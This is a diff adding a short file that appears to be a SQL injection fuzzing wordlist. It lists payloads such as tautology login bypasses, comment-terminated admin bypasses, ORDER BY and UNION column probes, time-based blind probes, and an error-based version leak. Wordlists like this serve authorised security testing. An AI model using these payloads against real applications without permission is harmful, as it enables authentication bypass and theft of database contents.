@@ -1,0 +1,20 @@
+'
+"
+' OR '1'='1
+' OR '1'='1'--
+" OR "1"="1
+' OR 1=1--
+' OR 1=1#
+') OR ('1'='1
+1' ORDER BY 1--
+1' ORDER BY 10--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND 1=CONVERT(int,@@version)--
+admin'--
+admin' #
+1 AND 1=1
+1 AND 1=2
+' OR 'x'='x
